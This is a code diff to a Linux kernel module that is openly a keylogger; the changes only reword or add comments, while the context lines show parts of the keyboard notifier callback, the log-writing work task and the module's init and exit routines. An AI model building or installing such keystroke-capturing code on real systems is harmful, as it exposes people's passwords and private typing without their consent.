@@ -120,8 +120,8 @@ size_t keycode_to_us_string(int keycode, int shift, char *buffer, size_t buff_si
 
 /* 
  * This callback is executed by the VT driver when a key event is performed.
- * This task is executed in an atomic context, so we cannot sleep,
- * so we cannot perform the write_kernel here to write the log on the file.
+ * This task is executed in an atomic context, we cannot sleep!
+ * So we cannot perform the write_kernel here to write the log on the file.
  */
 int keyboard_callback(struct notifier_block *kblock, unsigned long action, void *data)
 {
@@ -168,6 +168,7 @@ void write_log_task(struct work_struct *work)
 
     klogger = container_of(work, struct keyboard_logger, writer_task);
     
+    // Write the file
     kernel_write(klogger->log_file, klogger->write_buffer, klogger->buffer_len, &klogger->file_off);
 }
 
@@ -184,6 +185,7 @@ static int __init k_key_logger_init(void)
     klogger->keyboard_notifier.notifier_call = keyboard_callback;
     INIT_WORK(&klogger->writer_task, &write_log_task);
     
+    // Open the log file
     if(IS_ERR(klogger->log_file = filp_open(LOG_FILE_PATH, O_CREAT | O_RDWR, 0644)))
     {
         pr_info("Unable to create a log file\n");
@@ -202,6 +204,7 @@ static int __init k_key_logger_init(void)
 static void __exit k_key_logger_exit(void)
 {
 	unregister_keyboard_notifier(&klogger->keyboard_notifier);
+	// Close the log file
 	fput(klogger->log_file);
     kfree(klogger);
 }
